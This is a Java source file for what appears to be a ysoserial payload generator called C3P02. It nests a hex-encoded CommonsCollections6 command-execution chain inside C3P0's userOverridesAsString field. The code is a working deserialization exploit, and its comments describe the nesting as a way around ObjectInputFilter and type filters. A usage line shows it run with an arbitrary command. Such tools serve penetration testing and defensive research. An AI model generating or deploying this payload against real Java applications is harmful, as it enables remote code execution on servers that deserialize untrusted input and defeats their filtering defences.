package ysoserial.payloads;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	C3P0 second-order deserialization via hex-encoded userOverridesAsString.

	Original C3P0 research by @mbechler (marshalsec).
	Hex-encoded variant documented in JYso and various Chinese security community writeups.

	Gadget chain:
		ObjectInputStream.readObject()
			WrapperConnectionPoolDataSource.readObject()
				... property deserialization ...
					C3P0ImplUtils.parseUserOverridesAsString()
						SerializableUtils.fromByteArray()
							ObjectInputStream.readObject()    [NESTED DESERIALIZATION]
								[inner payload chain, e.g. CommonsCollections6]

	The userOverridesAsString field contains "HexAsciiSerializedMap:<hex>" where
	<hex> is a hex-encoded serialized Java object. During deserialization,
	C3P0 parses this string and deserializes the embedded object.

	Why this matters:
		- Bypasses first-layer type filters (outer object is just WrapperConnectionPoolDataSource)
		- Inner payload is invisible to ObjectInputFilter (hex-encoded, deserialized internally)
		- Similar concept to SignedObjectWrap but uses C3P0's internal mechanism
		- Works when c3p0 is on classpath (common in database-heavy Java apps)

	Usage:
		java -jar ysoserial.jar C3P02 'calc.exe'
		(wraps a CommonsCollections6 inner payload)

	Requires:
		c3p0 0.9.x
		commons-collections 3.x (for inner payload)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11",
	"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MBECHLER })
public class C3P02 extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		// Generate inner payload (CC6 chain)
		CommonsCollections6 cc6 = new CommonsCollections6();
		Object innerPayload = cc6.getObject(command);

		// Serialize inner payload to bytes
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos);
		oos.writeObject(innerPayload);
		oos.close();
		byte[] serializedInner = baos.toByteArray();

		// Hex-encode the serialized inner payload
		String hexPayload = bytesToHex(serializedInner);

		// Create the C3P0 wrapper with hex-encoded inner payload
		// Format expected by C3P0ImplUtils.parseUserOverridesAsString():
		//   "HexAsciiSerializedMap:" + hex_string + ";"
		String userOverridesAsString = "HexAsciiSerializedMap:" + hexPayload + ";";

		WrapperConnectionPoolDataSource wrapper =
			Reflections.createWithoutConstructor(WrapperConnectionPoolDataSource.class);
		Reflections.setFieldValue(wrapper, "userOverridesAsString", userOverridesAsString);

		return wrapper;
	}

	private static String bytesToHex(byte[] bytes) {
		StringBuilder sb = new StringBuilder(bytes.length * 2);
		for (byte b : bytes) {
			sb.append(String.format("%02x", b & 0xff));
		}
		return sb.toString();
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(C3P02.class, args);
	}
}
